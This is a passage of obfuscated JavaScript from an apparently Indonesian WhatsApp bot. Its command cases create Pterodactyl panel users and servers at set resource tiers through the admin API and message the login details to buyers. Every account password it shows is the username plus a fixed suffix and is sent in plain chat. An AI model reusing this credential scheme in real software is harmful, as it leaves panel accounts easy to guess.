          _0x221ba4.sendMessage(_0x5eb747, _0x7dbee0, {
            quoted: _0x221ba4.chat
          });
          let _0x2d244b = await _0x522c5c.json();
          let _0x1cb808 = _0x2d244b.attributes.startup;
          const _0x366837 = {
            memory: _0x102e4b,
            swap: 0,
            disk: _0x449461,
            io: 500,
            cpu: _0x16d2d5
          };
          let _0x32cef4 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x391d05,
              description: " ",
              user: _0x363d0e.id,
              egg: parseInt(_0x503bac),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x1cb808,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x366837,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x2a1c4c)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x274d31 = await _0x32cef4.json();
          if (_0x274d31.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x274d31.errors[0], null, 2));
          }
          let _0x2f4f90 = _0x274d31.attributes;
          let _0x58e369 = await _0x4611fa.reply("\nDáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x363d0e.id + "\n📌NAME: " + _0x363d0e.first_name + " " + _0x363d0e.last_name + "\n💵MEMORY: " + (_0x2f4f90.limits.memory === 0 ? "Unlimited" : _0x2f4f90.limits.memory) + " MB\n📦DISK: " + (_0x2f4f90.limits.disk === 0 ? "Unlimited" : _0x2f4f90.limits.disk) + " MB\n⌛CPU: " + _0x2f4f90.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪 Cpanel\n");
        }
        break;
      case "3gb":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x21bbd9 = _0x3e94bb.split(",");
          if (_0x21bbd9.length < 2) {
            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0xb21823 = _0x21bbd9[0];
          let _0x5bae70 = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x21bbd9[1] ? _0x21bbd9[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x2c19c6 = _0xb21823 + "3gb";
          let _0xc177eb = global.eggsnya;
          let _0x297021 = global.location;
          let _0x23771d = "3072";
          let _0x3414a2 = "70";
          let _0x1ed7df = "3072";
          let _0x32982a = _0xb21823 + "@Dáreen Albérich𓆰⸸𓆪";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0x5bae70) {
            return;
          }
          let _0x3d69e9 = (await _0x221ba4.onWhatsApp(_0x5bae70.split`@`[0]))[0] || {};
          let _0x1c206f = _0xb21823 + "Dáreen Albérich𓆰⸸𓆪";
          const _0x2447e2 = {
            email: _0x32982a,
            username: _0xb21823,
            first_name: _0xb21823,
            last_name: _0xb21823,
            language: "en",
            password: _0x1c206f
          };
          let _0x26599a = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x2447e2)
          });
          let _0x4c3faf = await _0x26599a.json();
          if (_0x4c3faf.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x4c3faf.errors[0], null, 2));
          }
          let _0x7b9920 = _0x4c3faf.attributes;
          let _0x4730ec = await fetch(domain + "/api/application/nests/5/eggs/" + _0xc177eb, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x7b9920.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪 Cpanel");
          ctf = "Hai @" + _0x5bae70.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x7b9920.username + "\n*➣ PASSWORD* : " + _0x1c206f + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪 Cpanel\n";
          const _0x54fb7b = {
            url: akunlo
          };
          const _0x281497 = {
            image: _0x54fb7b,
            caption: ctf
          };
          _0x221ba4.sendMessage(_0x5bae70, _0x281497, {
            quoted: _0x221ba4.chat
          });
          let _0x2653b4 = await _0x4730ec.json();
          let _0x3c95df = _0x2653b4.attributes.startup;
          const _0x1437c9 = {
            memory: _0x23771d,
            swap: 0,
            disk: _0x1ed7df,
            io: 500,
            cpu: _0x3414a2
          };
          let _0x5ddb73 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x2c19c6,
              description: " ",
              user: _0x7b9920.id,
              egg: parseInt(_0xc177eb),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x3c95df,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x1437c9,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x297021)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x24014c = await _0x5ddb73.json();
          if (_0x24014c.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x24014c.errors[0], null, 2));
          }
          let _0xff2289 = _0x24014c.attributes;
          let _0x13f1f7 = await _0x4611fa.reply("\n*Dáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x7b9920.id + "\n📌NAME: " + _0x7b9920.first_name + " " + _0x7b9920.last_name + "\n💵MEMORY: " + (_0xff2289.limits.memory === 0 ? "Unlimited" : _0xff2289.limits.memory) + " MB\n📦DISK: " + (_0xff2289.limits.disk === 0 ? "Unlimited" : _0xff2289.limits.disk) + " MB\n⌛CPU: " + _0xff2289.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪 Cpanel\n");
        }
        break;
      case "4gb":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x3c4a65 = _0x3e94bb.split(",");
          if (_0x3c4a65.length < 2) {
            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0x3d0821 = _0x3c4a65[0];
          let _0x1909c2 = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x3c4a65[1] ? _0x3c4a65[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x1551fd = _0x3d0821 + "4gb";
          let _0x24231d = global.eggsnya;
          let _0x4d0bca = global.location;
          let _0xe59f1 = "4048";
          let _0x1d325d = "90";
          let _0x4c9652 = "4048";
          let _0x2656d8 = _0x3d0821 + "@Dáreen Albérich𓆰⸸𓆪";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0x1909c2) {
            return;
          }
          let _0x2cc884 = (await _0x221ba4.onWhatsApp(_0x1909c2.split`@`[0]))[0] || {};
          let _0x3cdd66 = _0x3d0821 + "Dáreen Albérich𓆰⸸𓆪";
          const _0x5192d3 = {
            email: _0x2656d8,
            username: _0x3d0821,
            first_name: _0x3d0821,
            last_name: _0x3d0821,
            language: "en",
            password: _0x3cdd66
          };
          let _0x5c2a51 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x5192d3)
          });
          let _0x1ff5e5 = await _0x5c2a51.json();
          if (_0x1ff5e5.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x1ff5e5.errors[0], null, 2));
          }
          let _0x2e3016 = _0x1ff5e5.attributes;
          let _0x1231a1 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x24231d, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x2e3016.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪 Cpanel");
          ctf = "Hai @" + _0x1909c2.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x2e3016.username + "\n*➣ PASSWORD* : " + _0x3cdd66 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪 Cpanel\n";
          const _0x14f25e = {
            url: akunlo
          };
          const _0x32e07a = {
            image: _0x14f25e,
            caption: ctf
          };
          _0x221ba4.sendMessage(_0x1909c2, _0x32e07a, {
            quoted: _0x221ba4.chat
          });
          let _0x59be58 = await _0x1231a1.json();
          let _0x18c2af = _0x59be58.attributes.startup;
          const _0x29790d = {
            memory: _0xe59f1,
            swap: 0,
            disk: _0x4c9652,
            io: 500,
            cpu: _0x1d325d
          };
          let _0x46fc42 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x1551fd,
              description: " ",
              user: _0x2e3016.id,
              egg: parseInt(_0x24231d),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x18c2af,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x29790d,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x4d0bca)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x39fd9c = await _0x46fc42.json();
          if (_0x39fd9c.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x39fd9c.errors[0], null, 2));
          }
          let _0x36382c = _0x39fd9c.attributes;
          let _0x2bd9cf = await _0x4611fa.reply("\n*Dáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x2e3016.id + "\n📌NAME: " + _0x2e3016.first_name + " " + _0x2e3016.last_name + "\n💵MEMORY: " + (_0x36382c.limits.memory === 0 ? "Unlimited" : _0x36382c.limits.memory) + " MB\n📦DISK: " + (_0x36382c.limits.disk === 0 ? "Unlimited" : _0x36382c.limits.disk) + " MB\n⌛CPU: " + _0x36382c.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪 Cpanel\n");
        }
        break;
      case "unli":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.owner);
          }
          let _0x1207dc = _0x3e94bb.split(",");
          if (_0x1207dc.length < 2) {
            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0xbb82ca = _0x1207dc[0];
          let _0x409682 = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x1207dc[1] ? _0x1207dc[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x41875e = _0xbb82ca + "unli";
          let _0x4bb44e = global.eggsnya;
          let _0x194231 = global.location;
          let _0x369571 = "0";
          let _0x475515 = "0";
          let _0x1f67a9 = "0";
          let _0x560ec3 = _0xbb82ca + "@Dáreen Albérich𓆰⸸𓆪";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0x409682) {
            return;
          }
          let _0x50576e = (await _0x221ba4.onWhatsApp(_0x409682.split`@`[0]))[0] || {};
          let _0x488d71 = _0xbb82ca + "Dáreen Albérich𓆰⸸𓆪";
          const _0x52f97e = {
            email: _0x560ec3,
            username: _0xbb82ca,
            first_name: _0xbb82ca,
            last_name: _0xbb82ca,
            language: "en",
            password: _0x488d71
          };
          let _0xe54c84 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x52f97e)
          });
          let _0x2885d2 = await _0xe54c84.json();
          if (_0x2885d2.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x2885d2.errors[0], null, 2));
          }
          let _0x217ab4 = _0x2885d2.attributes;
          let _0x830bec = await fetch(domain + "/api/application/nests/5/eggs/" + _0x4bb44e, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x217ab4.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪Cpanel");
          ctf = "Hai @" + _0x409682.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x217ab4.username + "\n*➣ PASSWORD* : " + _0x488d71 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪Cpanel\n";
          const _0x294214 = {
            url: akunlo
          };
          const _0x1c4d20 = {
            image: _0x294214,
            caption: ctf
          };
          _0x221ba4.sendMessage(_0x409682, _0x1c4d20, {
            quoted: _0x221ba4.chat
          });
          let _0x3401f5 = await _0x830bec.json();
          let _0x24e1b9 = _0x3401f5.attributes.startup;
          const _0x442848 = {
            memory: _0x369571,
            swap: 0,
            disk: _0x1f67a9,
            io: 500,
            cpu: _0x475515
          };
          let _0x222733 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x41875e,
              description: " ",
              user: _0x217ab4.id,
              egg: parseInt(_0x4bb44e),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x24e1b9,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x442848,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x194231)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x2e2213 = await _0x222733.json();
          if (_0x2e2213.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x2e2213.errors[0], null, 2));
          }
          let _0x2b5387 = _0x2e2213.attributes;
          let _0x2c0087 = await _0x4611fa.reply("\nDáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x217ab4.id + "\n📌NAME: " + _0x217ab4.first_name + " " + _0x217ab4.last_name + "\n💵MEMORY: " + (_0x2b5387.limits.memory === 0 ? "Unlimited" : _0x2b5387.limits.memory) + " MB\n📦DISK: " + (_0x2b5387.limits.disk === 0 ? "Unlimited" : _0x2b5387.limits.disk) + " MB\n⌛CPU: " + _0x2b5387.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪Cpanel\n");
        }
        break;
      case "5gb":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x483441 = _0x3e94bb.split(",");
          if (_0x483441.length < 2) {
            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0x4ec44a = _0x483441[0];
          let _0x23c0cb = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x483441[1] ? _0x483441[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x61f9d = _0x4ec44a + "5gb";
          let _0x30ff57 = global.eggsnya;
          let _0xb2ba39 = global.location;
          let _0x3631ee = "5138";
          let _0x51b4ab = "100";
          let _0x453458 = "5138";
          let _0x52ab22 = _0x4ec44a + "@Dáreen Albérich𓆰⸸𓆪";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0x23c0cb) {
            return;
          }
          let _0x153ee6 = (await _0x221ba4.onWhatsApp(_0x23c0cb.split`@`[0]))[0] || {};
          let _0x388aaf = _0x4ec44a + "Dáreen Albérich𓆰⸸𓆪";
          const _0x134efa = {
            email: _0x52ab22,
            username: _0x4ec44a,
            first_name: _0x4ec44a,
            last_name: _0x4ec44a,
            language: "en",
            password: _0x388aaf
          };
          let _0x2a104f = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x134efa)
          });
          let _0x27532d = await _0x2a104f.json();
          if (_0x27532d.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x27532d.errors[0], null, 2));
          }
          let _0x421ec2 = _0x27532d.attributes;
          let _0x1fe3d5 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x30ff57, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x421ec2.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪Cpanel");
          ctf = "Hai @" + _0x23c0cb.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x421ec2.username + "\n*➣ PASSWORD* : " + _0x388aaf + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪Cpanel\n";
          const _0x588fd6 = {
            url: akunlo
          };
          const _0x3297a5 = {
            image: _0x588fd6,
            caption: ctf
          };
          _0x221ba4.sendMessage(_0x23c0cb, _0x3297a5, {
            quoted: _0x221ba4.chat
          });
          let _0x4732f7 = await _0x1fe3d5.json();
          let _0x5977ea = _0x4732f7.attributes.startup;
          const _0x4cc275 = {
            memory: _0x3631ee,
            swap: 0,
            disk: _0x453458,
            io: 500,
            cpu: _0x51b4ab
          };
          let _0x1a2c5f = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x61f9d,
              description: " ",
              user: _0x421ec2.id,
              egg: parseInt(_0x30ff57),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x5977ea,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x4cc275,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0xb2ba39)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x505420 = await _0x1a2c5f.json();
          if (_0x505420.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x505420.errors[0], null, 2));
          }
          let _0x98445a = _0x505420.attributes;
          let _0x3e3e6b = await _0x4611fa.reply("\n*Dáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x421ec2.id + "\n📌NAME: " + _0x421ec2.first_name + " " + _0x421ec2.last_name + "\n💵MEMORY: " + (_0x98445a.limits.memory === 0 ? "Unlimited" : _0x98445a.limits.memory) + " MB\n📦DISK: " + (_0x98445a.limits.disk === 0 ? "Unlimited" : _0x98445a.limits.disk) + " MB\n⌛CPU: " + _0x98445a.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪Cpanel\n");
        }
        break;
      case "6gb":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x56676f = _0x3e94bb.split(",");
          if (_0x56676f.length < 2) {
            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0x22cd6e = _0x56676f[0];
          let _0x1c1f4b = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x56676f[1] ? _0x56676f[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x11be84 = _0x22cd6e + "6GB";
          let _0x4d694b = global.eggsnya;
          let _0x11b450 = global.location;
          let _0x50a0f7 = "6138";
          let _0x5d955a = "120";
          let _0x2e3c4e = "6138";
          let _0x333c1e = _0x22cd6e + "@Dáreen Albérich𓆰⸸𓆪";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0x1c1f4b) {
            return;
          }
          let _0x555665 = (await _0x221ba4.onWhatsApp(_0x1c1f4b.split`@`[0]))[0] || {};
          let _0x4b640d = _0x22cd6e + "Dáreen Albérich𓆰⸸𓆪";
          const _0x521f58 = {
            email: _0x333c1e,
            username: _0x22cd6e,
            first_name: _0x22cd6e,
            last_name: _0x22cd6e,
            language: "en",
            password: _0x4b640d
          };
          let _0x12e9f3 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x521f58)
          });
          let _0x4b8a08 = await _0x12e9f3.json();
          if (_0x4b8a08.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x4b8a08.errors[0], null, 2));
          }
          let _0x116111 = _0x4b8a08.attributes;
          let _0x197276 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x4d694b, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x116111.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪Cpanel");
          ctf = "Hai @" + _0x1c1f4b.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x116111.username + "\n*➣ PASSWORD* : " + _0x4b640d + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪Cpanel\n";
          const _0x1164c9 = {
            url: akunlo
          };
          const _0xf5af02 = {
            image: _0x1164c9,
            caption: ctf
          };
          _0x221ba4.sendMessage(_0x1c1f4b, _0xf5af02, {
            quoted: _0x221ba4.chat
          });
          let _0x59dc40 = await _0x197276.json();
          let _0x18ac69 = _0x59dc40.attributes.startup;
          const _0x1eb694 = {
            memory: _0x50a0f7,
            swap: 0,
            disk: _0x2e3c4e,
            io: 500,
            cpu: _0x5d955a
          };
          let _0x5d47a4 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x11be84,
              description: " ",
              user: _0x116111.id,
              egg: parseInt(_0x4d694b),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x18ac69,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x1eb694,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x11b450)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x3c5418 = await _0x5d47a4.json();
          if (_0x3c5418.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x3c5418.errors[0], null, 2));
          }
          let _0xef9f01 = _0x3c5418.attributes;
          let _0x5d0ec0 = await _0x4611fa.reply("\n*Dáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x116111.id + "\n📌NAME: " + _0x116111.first_name + " " + _0x116111.last_name + "\n💵MEMORY: " + (_0xef9f01.limits.memory === 0 ? "Unlimited" : _0xef9f01.limits.memory) + " MB\n📦DISK: " + (_0xef9f01.limits.disk === 0 ? "Unlimited" : _0xef9f01.limits.disk) + " MB\n⌛CPU: " + _0xef9f01.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪Cpanel\n");
        }
        break;
      case "7gb":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x25b71d = _0x3e94bb.split(",");
          if (_0x25b71d.length < 2) {
